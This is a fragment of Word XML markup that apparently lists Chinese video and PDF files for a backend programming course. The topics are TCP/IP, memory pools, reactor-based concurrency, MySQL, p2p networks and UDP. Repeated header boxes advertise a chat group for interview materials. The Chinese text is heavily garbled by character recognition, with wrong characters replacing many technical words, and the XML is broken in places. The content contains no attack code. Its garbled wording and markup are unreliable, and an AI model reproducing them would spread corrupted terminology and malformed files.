        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:sectPr>
          <w:headerReference r:id="rId26" w:type="default"/>
          <w:headerReference r:id="rId27" w:type="even"/>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1505" w:right="1706" w:bottom="1460" w:left="1688" w:header="0" w:footer="1032" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>面涙题</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">.pdf </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>面涙题</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">.pdf </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>面涙题</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.pdf</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Q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>面</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>试分享</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.mp4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="6220"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>H| TCPI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>呦议栈，一次课开启你的网络之门</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.mp4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>碍&amp;面</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Q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>高校能</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>服务器为什么房要内存池</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Q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>手踌</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>线密</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>&amp;.mp4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 xml:space="preserve">Q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>reactorigtHQ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>线®现高并灘騁</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Q ngi n&gt;®§—</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>线密&amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的实现</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">.m </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>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 xml:space="preserve">Q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的块應提作</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Q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>高并发</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>tcpip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>网塔</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>io.mp4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 xml:space="preserve">Q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>去中心化</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>,p2p ,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>网络弃</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">一 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>走</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 xml:space="preserve">Q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>服家能職化</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>糸璀遊</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 xml:space="preserve">Q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>区块链的底昙，去中心化网塔的设计</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 xml:space="preserve">Q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>深入注出</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>UDP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>传箍原理及踌分片方法</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10" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>线程月陛事</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.mp4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="A09FF9"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>后台服务噂挂了怎么办</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.mp4</w:t>
      </w:r>
    </w:p>
    <w:sectPr>
      <w:footnotePr>
        <w:numFmt w:val="decimal"/>
      </w:footnotePr>
      <w:pgSz w:w="11900" w:h="16840"/>
      <w:pgMar w:top="1895" w:right="1607" w:bottom="1895" w:left="1787" w:header="0" w:footer="1467"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2563495</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="1" name="Shape 1"/>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更多、更全面试学习技术资料清加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rPr>
                            <w:t>群：762073882</w:t>
                          </w:r>
                        </w:p>
                      </w:txbxContent>
                    </wps:txbx>
                    <wps:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0">
                      <a:spAutoFit/>
                    </wps:bodyPr>
                  </wps:wsp>
                </a:graphicData>
              </a:graphic>
            </wp:anchor>
          </w:drawing>
        </mc:Choice>
        <mc:Fallback>
          <w:pict>
            <v:shape id="Shape 1" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:201.85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FE45PVAAAACgEAAA8A&#10;AAAAAAAAAQAgAAAAIgAAAGRycy9kb3ducmV2LnhtbFBLAQIUABQAAAAIAIdO4kBjpxHIqAEAAHAD&#10;AAAOAAAAAAAAAAEAIAAAACQBAABkcnMvZTJvRG9jLnhtbFBLBQYAAAAABgAGAFkBAAA+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更多、更全面试学习技术资料清加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rPr>
                      <w:t>群：762073882</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2486660</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="56" name="Shape 56"/>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56" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:195.8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Eg2jtYAAAAKAQAA&#10;DwAAAAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQBTiw1a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2514600</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="58" name="Shape 58"/>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58" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:198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F1fp+dYAAAAKAQAA&#10;DwAAAAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQJO90VW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1171575</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>998220</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="5267325" cy="0"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="60" name="Shape 60"/>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60" o:spid="_x0000_s1026" o:spt="32" type="#_x0000_t32" style="position:absolute;left:0pt;margin-left:92.25pt;margin-top:78.6pt;height:0pt;width:414.75pt;mso-position-horizontal-relative:page;mso-position-vertical-relative:page;z-index:-503315456;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="t" coordsize="21600,21600" o:gfxdata="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wWS+7XAAAADAEAAA8A&#10;AAAAAAAAAQAgAAAAIgAAAGRycy9kb3ducmV2LnhtbFBLAQIUABQAAAAIAIdO4kCb38H/pgEAAFwD&#10;AAAOAAAAAAAAAAEAIAAAACYBAABkcnMvZTJvRG9jLnhtbFBLBQYAAAAABgAGAFkBAAA+BQAAAAA=&#10;">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2514600</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="61" name="Shape 61"/>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61" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:198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F1fp+dYAAAAKAQAA&#10;DwAAAAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQDzMEm2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1171575</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>998220</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="5267325" cy="0"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="63" name="Shape 63"/>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63" o:spid="_x0000_s1026" o:spt="32" type="#_x0000_t32" style="position:absolute;left:0pt;margin-left:92.25pt;margin-top:78.6pt;height:0pt;width:414.75pt;mso-position-horizontal-relative:page;mso-position-vertical-relative:page;z-index:-503315456;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="t" coordsize="21600,21600" o:gfxdata="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wWS+7XAAAADAEAAA8A&#10;AAAAAAAAAQAgAAAAIgAAAGRycy9kb3ducmV2LnhtbFBLAQIUABQAAAAIAIdO4kBGstuCpgEAAFwD&#10;AAAOAAAAAAAAAAEAIAAAACYBAABkcnMvZTJvRG9jLnhtbFBLBQYAAAAABgAGAFkBAAA+BQAAAAA=&#10;">
              <v:fill on="f" focussize="0,0"/>
              <v:stroke weight="1pt" color="#FFFFFF" joinstyle="round"/>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2507615</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="64" name="Shape 64"/>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64" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:197.45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hSQNYAAAAKAQAA&#10;DwAAAAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQF6kk4G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2507615</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="66" name="Shape 66"/>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66" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:197.45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hSQNYAAAAKAQAA&#10;DwAAAAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQN9gI4G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2496820</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="72" name="Shape 72"/>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72" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:196.6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jUEq9YAAAAKAQAA&#10;DwAAAAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQGRoHc2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2496820</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="74" name="Shape 74"/>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74" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:196.6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o1BKvWAAAACgEA&#10;AA8AAAAAAAAAAQAgAAAAIgAAAGRycy9kb3ducmV2LnhtbFBLAQIUABQAAAAIAIdO4kDnJczMqgEA&#10;AHIDAAAOAAAAAAAAAAEAIAAAACUBAABkcnMvZTJvRG9jLnhtbFBLBQYAAAAABgAGAFkBAABBBQAA&#10;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2507615</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="76" name="Shape 76"/>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76" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:197.45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hSQNYAAAAKAQAA&#10;DwAAAAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQGbhfMy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2563495</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="3" name="Shape 3"/>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更多、更全面试学习技术资料清加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rPr>
                            <w:t>群：762073882</w:t>
                          </w:r>
                        </w:p>
                      </w:txbxContent>
                    </wps:txbx>
                    <wps:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0">
                      <a:spAutoFit/>
                    </wps:bodyPr>
                  </wps:wsp>
                </a:graphicData>
              </a:graphic>
            </wp:anchor>
          </w:drawing>
        </mc:Choice>
        <mc:Fallback>
          <w:pict>
            <v:shape id="Shape 3" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:201.85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hROOT1QAAAAoBAAAP&#10;AAAAAAAAAAEAIAAAACIAAABkcnMvZG93bnJldi54bWxQSwECFAAUAAAACACHTuJAN1idXqkBAABw&#10;AwAADgAAAAAAAAABACAAAAAkAQAAZHJzL2Uyb0RvYy54bWxQSwUGAAAAAAYABgBZAQAAPwU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更多、更全面试学习技术资料清加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rPr>
                      <w:t>群：762073882</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2468880</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="78" name="Shape 78"/>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78" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:194.4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8vkij9YAAAAKAQAA&#10;DwAAAAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQOG+bs+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1125855</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>998220</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="5267325" cy="0"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="80" name="Shape 80"/>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80" o:spid="_x0000_s1026" o:spt="32" type="#_x0000_t32" style="position:absolute;left:0pt;margin-left:88.65pt;margin-top:78.6pt;height:0pt;width:414.75pt;mso-position-horizontal-relative:page;mso-position-vertical-relative:page;z-index:-503315456;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="t" coordsize="21600,21600" o:gfxdata="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oLs0jUAAAADAEAAA8AAAAA&#10;AAAAAQAgAAAAIgAAAGRycy9kb3ducmV2LnhtbFBLAQIUABQAAAAIAIdO4kDOJmewpgEAAFwDAAAO&#10;AAAAAAAAAAEAIAAAACMBAABkcnMvZTJvRG9jLnhtbFBLBQYAAAAABgAGAFkBAAA7BQAAAAA=&#10;">
              <v:fill on="f" focussize="0,0"/>
              <v:stroke weight="1pt" color="#FFFFFF" joinstyle="round"/>
              <v:imagedata o:title=""/>
              <o:lock v:ext="edit" aspectratio="f"/>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2468880</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>555625</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="2571750" cy="257175"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
              <wp:docPr id="81" name="Shape 81"/>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81" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:194.4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8vkij9YAAAAKAQAA&#10;DwAAAAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQODIzR6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1125855</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="page">
                <wp:posOffset>998220</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="5267325" cy="0"/>
              <wp:effectExtent l="0" t="0" r="0" b="0"/>
              <wp:wrapNone/>
